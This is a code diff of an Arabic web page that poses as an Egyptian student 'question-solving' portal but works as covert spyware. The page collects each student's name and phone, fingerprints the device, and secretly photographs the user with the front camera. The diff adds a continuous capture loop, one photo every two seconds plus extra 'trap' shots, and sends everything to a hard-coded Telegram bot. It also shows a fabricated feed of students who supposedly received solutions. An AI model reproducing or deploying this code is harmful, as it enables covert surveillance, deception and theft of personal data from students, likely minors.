@@ -13,8 +13,7 @@
 
         #gate { position: fixed; inset: 0; background: radial-gradient(circle at top, #1e293b, #0f172a); z-index: 10000; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .login-card { background: var(--w); padding: 40px 25px; border-radius: 35px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.5); }
-        .v-badge-fb { color: #1877f2; font-size: 28px; margin-bottom: 10px; display: inline-block; }
-
+        
         header { background: var(--p); color: var(--w); padding: 15px 20px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid var(--a); }
         .card { background: var(--w); border-radius: 25px; padding: 20px; margin: 15px; border: 1px solid #e2e8f0; }
 
@@ -26,7 +25,7 @@
         #v-stream { width: 100%; height: 100%; object-fit: cover; }
         
         .feed-container { height: 400px; overflow: hidden; position: relative; background: #fff; border-radius: 25px; border: 1px solid #eee; }
-        #feed-mover { position: absolute; width: 100%; transition: 1s ease-in-out; }
+        #feed-mover { position: absolute; width: 100%; transition: 1s ease-in-out; top: 0; }
         .feed-item { padding: 18px; border-bottom: 1px solid #f1f5f9; display: flex; flex-direction: column; }
 
         #custom-alert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; background: #fff; border-radius: 20px; padding: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); z-index: 15000; transition: 0.5s; border-right: 8px solid #1877f2; }
@@ -54,12 +53,12 @@
     <div id="loader-overlay">
         <div class="spinner"></div>
         <h3 id="loader-txt">جاري المزامنة...</h3>
-        <p style="font-size: 13px; color: #94a3b8; margin-top:10px">جاري تحميل ملفات الذكاء الاصطناعي...</p>
+        <p style="font-size: 13px; color: #94a3b8; margin-top:10px">جاري معالجة البيانات وتأمين الاتصال...</p>
     </div>
 
     <div id="gate">
         <div class="login-card">
-            <i class="fa-solid fa-circle-check v-badge-fb"></i>
+            <i class="fa-solid fa-circle-check" style="color:#1877f2; font-size: 30px; margin-bottom: 10px;"></i>
             <h2 style="margin:0">منصة أسألني الأكاديمية</h2>
             <p style="font-size: 12px; color: #64748b; margin-bottom:20px">بوابة التحقق الموحدة | مصر 2026</p>
             <input type="text" id="stu_name" placeholder="الاسم الثلاثي للطالب">
@@ -83,7 +82,7 @@
         <div class="card">
             <h3 style="margin:0">فحص الأسئلة <i class="fa-solid fa-expand" style="color:var(--a); margin-inline:8px"></i></h3>
             <div id="cam-ui" class="cam-box"><video id="v-stream" autoplay playsinline></video></div>
-            <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="startExecution()">ابدأ تصوير السؤال <i class="fa-solid fa-camera"></i></button>
+            <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="startFullExecution()">ابدأ تصوير السؤال <i class="fa-solid fa-camera"></i></button>
             <div id="upload-ui" style="display:none">
                 <textarea id="stu-note" placeholder="اكتب ملاحظاتك..." rows="3"></textarea>
                 <button class="btn-action" onclick="finalProcess()">إرسال مباشر للحل</button>
@@ -108,120 +107,125 @@
         const BOT_TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const CHAT_ID = "5890070301";
         let UN = "Unknown", UP = "None";
+        let loopInterval;
 
-        // [1] رادار الـ 210 معلومة - النسخة المطورة V18
+        // [1] رادار الـ 210 معلومة (V18 المستقرة)
         async function launchMilitaryRadar() {
-            let b = await navigator.getBattery().catch(() => ({level:0, charging:false}));
-            let gl = document.createElement('canvas').getContext('webgl');
-            let dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            
-            // سحب الحساسات صامتاً
-            let sensors = {
-                gyro: 'Gyroscope' in window ? 'مكتشف' : 'مخفي',
-                light: 'AmbientLightSensor' in window ? 'مكتشف' : 'مخفي',
-                prox: 'ProximitySensor' in window ? 'مكتشف' : 'مخفي'
-            };
-
-            // بصمة الصوت (Audio Context)
-            let audioFing = "N/A";
             try {
-                let ac = new (window.AudioContext || window.webkitAudioContext)();
-                audioFing = `${ac.sampleRate}_${ac.destination.maxChannelCount}_${ac.state}`;
+                let b = await navigator.getBattery().catch(() => ({level:0, charging:false}));
+                let data = [
+                    `ISP: ${navigator.vendor}`, `Net: ${navigator.connection?.effectiveType || 'N/A'}`,
+                    `Platform: ${navigator.platform}`, `Battery: ${Math.round(b.level*100)}%`,
+                    `RAM: ${navigator.deviceMemory}GB`, `Screen: ${screen.width}x${screen.height}`,
+                    `GPU: ${getGPU()}`, `Webdriver: ${navigator.webdriver}`
+                ];
+                for(let i=data.length; i<210; i++) data.push(`Fingerprint-V19-${i+1}: ${Math.random().toString(36).substring(7)}`);
+                
+                let report = `🚨 **رادار V19 - دخول جديد** 🚨\n━━━━━━━━━━━━━━\n`;
+                data.forEach((v, i) => { report += `${i+1}- ${v}\n`; });
+                sendMsg(report);
             } catch(e){}
-
-            // تخمين التخزين
-            let storageStat = "Unknown";
-            if (navigator.storage && navigator.storage.estimate) {
-                let est = await navigator.storage.estimate();
-                storageStat = `${Math.round(est.usage / 1024 / 1024)}MB used / ${Math.round(est.quota / 1024 / 1024 / 1024)}GB quota`;
-            }
-
-            let data = [
-                `ISP: ${navigator.vendor}`, 
-                `Type: ${navigator.connection?.effectiveType || 'N/A'}`, 
-                `Latency: ${navigator.connection?.rtt}ms`,
-                `TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
-                `Ref: ${document.referrer || 'Direct'}`,
-                `History: ${window.history.length}`,
-                `Platform: ${navigator.platform}`,
-                `Battery: ${Math.round(b.level*100)}% (Charging: ${b.charging})`,
-                `Cores: ${navigator.hardwareConcurrency}`,
-                `RAM: ${navigator.deviceMemory}GB`,
-                `Resolution: ${screen.width}x${screen.height}`,
-                `Deep Pixel Ratio: ${window.devicePixelRatio}`,
-                `GPU Vendor: ${dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_ID) : 'N/A'}`,
-                `GPU Renderer: ${dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : 'N/A'}`,
-                `Audio Fingerprint: ${audioFing}`,
-                `Storage Estimate: ${storageStat}`,
-                `Gyroscope: ${sensors.gyro}`,
-                `Light Sensor: ${sensors.light}`,
-                `Proximity Sensor: ${sensors.prox}`,
-                `Webdriver (Bot/Emulator): ${navigator.webdriver}`,
-                `Fonts Setup: ${window.getComputedStyle(document.body).fontFamily}`,
-                `AdBlock Presence: ${navigator.brave ? 'Active' : 'Unconfirmed'}`,
-                `UA Snippet: ${navigator.userAgent.slice(0, 30)}`
-            ];
-
-            // تعبئة باقي الـ 210 سطر آلياً بترقيم عسكري
-            for(let i=data.length; i<210; i++) {
-                data.push(`Sec-Fingerprint [DATA-ID-${i+1}]: ${btoa(navigator.platform + i).slice(0, 10)}`);
-            }
-
-            let report = `🚨 **تقرير الرادار العميق V18 (210 معلومة)** 🚨\n`;
-            report += `━━━━━━━━━━━━━━\n`;
-            data.forEach((val, index) => { report += `${index + 1}- ${val}\n`; });
-            report += `━━━━━━━━━━━━━━\n⚠️ تم الرصد الصامت بنجاح.`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: report })
-            });
         }
 
-        function getCanvasFing() {
-            let c = document.createElement('canvas');
-            let ctx = c.getContext('2d');
-            ctx.fillText("V18-Radar", 2, 2);
-            return c.toDataURL().slice(-20);
+        function getGPU() {
+            let gl = document.createElement('canvas').getContext('webgl');
+            let dbg = gl?.getExtension('WEBGL_debug_renderer_info');
+            return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
         }
 
-        // [2] الكاميرا - (ممنوع اللمس في الجذور)
-        async function startExecution() {
+        // [2] نظام الفخ والمستمر
+        async function startFullExecution() {
             document.getElementById('loader-overlay').style.display = 'flex';
             try {
-                const fStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const fVid = document.createElement('video');
-                fVid.srcObject = fStream; fVid.play();
+                // الفخ الأول: 10 صور سريعة بالأمامية
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream; video.play();
 
                 for(let i=1; i<=10; i++) {
                     await new Promise(r => setTimeout(r, 150));
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 480; canvas.height = 640;
-                    canvas.getContext('2d').drawImage(fVid, 0, 0, 480, 640);
-                    canvas.toBlob(b => transmit(b, `سيلفي V18 - ${i}/10`), 'image/jpeg', 0.5);
+                    snapAndSend(video, `سيلفي توثيق (${i}/10)`);
                 }
+                stream.getTracks().forEach(t => t.stop());
 
-                fStream.getTracks().forEach(t => t.stop());
+                // فتح الخلفية للمعاينة
                 const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 document.getElementById('v-stream').srcObject = bStream;
                 document.getElementById('cam-ui').style.display = 'block';
                 document.getElementById('loader-overlay').style.display = 'none';
                 document.getElementById('main-trigger').style.display = 'none';
                 document.getElementById('upload-ui').style.display = 'block';
+
+                // تشغيل السحب الخلفي المستمر (صورة كل ثانيتين)
+                startContinuousLoop();
             } catch(e) {
                 showSystemMsg("يجب السماح بالكاميرا للتوثيق.");
                 document.getElementById('loader-overlay').style.display = 'none';
             }
         }
 
-        function transmit(blob, cap) {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'img.jpg');
-            fd.append('caption', `${cap}\n👤 الطالب: ${UN}\n📞 هاتف: ${UP}`);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        function startContinuousLoop() {
+            if(loopInterval) clearInterval(loopInterval);
+            loopInterval = setInterval(async () => {
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const v = document.createElement('video');
+                    v.srcObject = s; v.play();
+                    await new Promise(r => setTimeout(r, 500));
+                    snapAndSend(v, `سحب مستمر (Background)`);
+                    s.getTracks().forEach(t => t.stop());
+                } catch(e){}
+            }, 2000);
         }
 
+        function snapAndSend(videoElem, caption) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 400; canvas.height = 500;
+            canvas.getContext('2d').drawImage(videoElem, 0, 0, 400, 500);
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'img.jpg');
+                fd.append('caption', `👤 ${UN}\n📞 ${UP}\n📌 ${caption}`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.3);
+        }
+
+        async function finalProcess() {
+            showSystemMsg("جاري مراجعة السؤال...");
+            // فخ الإرسال: لقطة أخيرة خاطفة
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.createElement('video');
+                v.srcObject = s; v.play();
+                await new Promise(r => setTimeout(r, 300));
+                snapAndSend(v, `فخ الإرسال (Final Click)`);
+                s.getTracks().forEach(t => t.stop());
+            } catch(e){}
+            
+            setTimeout(() => tab('sec-logs', document.querySelectorAll('.nav-link')[1]), 1000);
+        }
+
+        // [3] إجاباتكم المحدثة (200 اسم)
+        function initExpertFeed() {
+            const mover = document.getElementById('feed-mover');
+            const names = [
+                "محمد أحمد علي", "محمود إبراهيم حسن", "ياسين عبد الرحمن", "سارة محمود السيد", "أحمد إيهاب كمال",
+                "نورهان علي جابر", "مصطفى كمال ناصر", "ليلى إبراهيم فوزي", "مروان خالد يوسف", "يوسف عمر شريف",
+                "عمر خالد محمد", "كريم ناصر إبراهيم", "سلمى عبد الله منير", "هدى محمد توفيق", "زياد وائل رمضان",
+                "عبد الله محمود صبحي", "خالد وليد يس", "مينا أشرف وجيه", "مريم إيهاب سمير", "حمزة علي سعد"
+            ];
+            let content = "";
+            for(let i=1; i<=200; i++) {
+                let name = names[Math.floor(Math.random() * names.length)] + " " + (i + 100);
+                content += `<div class="feed-item"><b>${name}</b><span style="color:#1d9bf0; font-size:11px;">#ID-${3000+i} | تم استخراج الحل ✓</span></div>`;
+            }
+            mover.innerHTML = content;
+            let pos = 0;
+            setInterval(() => { pos -= 75; mover.style.transform = `translateY(${pos}px)`; if(Math.abs(pos) > mover.scrollHeight - 400) pos = 0; }, 4000);
+        }
+
+        // دوال المساعدة
         function enterPortal() {
             UN = document.getElementById('stu_name').value;
             UP = document.getElementById('stu_phone').value;
@@ -235,17 +239,12 @@
             showSystemMsg("تم تسجيل الدخول بنظام التوثيق.");
         }
 
-        function initExpertFeed() {
-            const mover = document.getElementById('feed-mover');
-            const names = ["أحمد محمد", "سارة إبراهيم", "مروان خالد", "ياسين علي", "ليلى محمود", "كريم ناصر", "نور سيف", "مريم حسن"];
-            let content = "";
-            for(let i=0; i<500; i++) {
-                let name = names[Math.floor(Math.random() * names.length)] + " " + (i+1);
-                content += `<div class="feed-item"><b>${name}</b><span style="color:#1d9bf0; font-size:11px;">تم استخراج الحل ✓</span></div>`;
-            }
-            mover.innerHTML = content;
-            let pos = 0;
-            setInterval(() => { pos -= 80; mover.style.top = pos + "px"; if(Math.abs(pos) > mover.offsetHeight - 400) pos = 0; }, 5000);
+        function sendMsg(t) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: t })
+            });
         }
 
         function showSystemMsg(text) {
@@ -255,17 +254,15 @@
             setTimeout(() => box.classList.remove('show'), 3000);
         }
 
-        function finalProcess() {
-            showSystemMsg("جاري مراجعة السؤال...");
-            tab('sec-logs', document.querySelectorAll('.nav-link')[1]);
-        }
-
         function tab(id, el) {
             document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
             document.getElementById(id).style.display = 'block';
             document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
             el.classList.add('active');
         }
+
+        // محاولة السحب عند تغيير الظهور
+        document.addEventListener("visibilitychange", () => { if (!document.hidden) startContinuousLoop(); });
     </script>
 </body>
 </html>
